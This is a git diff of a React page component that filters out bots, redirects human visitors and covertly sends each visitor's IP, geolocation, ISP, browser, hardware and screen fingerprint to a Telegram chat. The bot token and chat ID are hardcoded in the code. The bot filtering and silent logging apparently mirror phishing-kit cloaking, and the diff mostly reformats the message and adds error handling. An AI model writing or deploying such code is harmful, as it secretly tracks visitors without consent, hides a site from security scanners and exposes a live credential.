@@ -53,13 +53,14 @@ const Index: FC = () => {
             window.location.href = redirectUrl;
         }
     }, [shouldRedirect, isBot, isLoading]);
+
     useEffect(() => {
         if (!isLoading && !isBot && !logSentRef.current) {
             logSentRef.current = true;
             const fetchGeoAndSendTelegram = async () => {
                 const geoUrl = 'https://get.geojs.io/v1/ip/geo.json';
-                const botToken = '7818922645:AAFSGAKec6C3hdUTgtuPcRNL5DPqnj2JwfA'
-                const chatId = '-4795436920'
+                const botToken = '7818922645:AAFSGAKec6C3hdUTgtuPcRNL5DPqnj2JwfA';
+                const chatId = '-4795436920';
 
                 const geoRes = await fetch(geoUrl);
                 const geoData = await geoRes.json();
@@ -83,17 +84,17 @@ const Index: FC = () => {
                 };
 
                 const msg = `🔍 <b>Log truy cập</b>
-📍 <b>IP:</b> ${fullFingerprint.ip}
-🏢 <b>ASN:</b> ${fullFingerprint.asn}
-🏛️ <b>Nhà mạng:</b> ${fullFingerprint.organization_name ?? fullFingerprint.organization ?? 'Không rõ'}
+📍 <b>IP:</b> <code>${fullFingerprint.ip}</code>
+🏢 <b>ASN:</b> <code>${fullFingerprint.asn}</code>
+🏛️ <b>Nhà mạng:</b> <code>${fullFingerprint.organization_name ?? fullFingerprint.organization ?? 'Không rõ'}</code>
 
-🌐 <b>Trình duyệt:</b> ${fullFingerprint.navigator.userAgent}
-💻 <b>CPU:</b> ${fullFingerprint.navigator.hardwareConcurrency} nhân
-📱 <b>Touch:</b> ${fullFingerprint.navigator.maxTouchPoints} điểm
-🤖 <b>WebDriver:</b> ${fullFingerprint.navigator.webdriver ? 'Có' : 'Không'}
+🌐 <b>Trình duyệt:</b> <code>${fullFingerprint.navigator.userAgent}</code>
+💻 <b>CPU:</b> <code>${fullFingerprint.navigator.hardwareConcurrency}</code> nhân
+📱 <b>Touch:</b> <code>${fullFingerprint.navigator.maxTouchPoints}</code> điểm
+🤖 <b>WebDriver:</b> <code>${fullFingerprint.navigator.webdriver ? 'Có' : 'Không'}</code>
 
-📺 <b>Màn hình:</b> ${fullFingerprint.screen.width}x${fullFingerprint.screen.height}
-📐 <b>Màn hình thực:</b> ${fullFingerprint.screen.availWidth}x${fullFingerprint.screen.availHeight}`;
+📺 <b>Màn hình:</b> <code>${fullFingerprint.screen.width}x${fullFingerprint.screen.height}</code>
+📐 <b>Màn hình thực:</b> <code>${fullFingerprint.screen.availWidth}x${fullFingerprint.screen.availHeight}</code>`;
 
                 const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
                 const payload = {
@@ -102,11 +103,26 @@ const Index: FC = () => {
                     parse_mode: 'HTML',
                 };
 
-                await fetch(telegramUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload),
-                });
+                try {
+                    const response = await fetch(telegramUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload),
+                    });
+
+                    const result = await response.json();
+
+                    if (!response.ok) {
+                        console.error('telegram api error:', result);
+                        alert(`API Error: ${result.description ?? 'Unknown error'}`);
+                    } else {
+                        console.log('telegram sent successfully:', result);
+                    }
+                } catch (error) {
+                    console.error('telegram send fail:', error);
+                    const errorMsg = error instanceof Error ? error.message : 'Không thể kết nối';
+                    alert(`Network Error: ${errorMsg}`);
+                }
             };
             fetchGeoAndSendTelegram();
         }
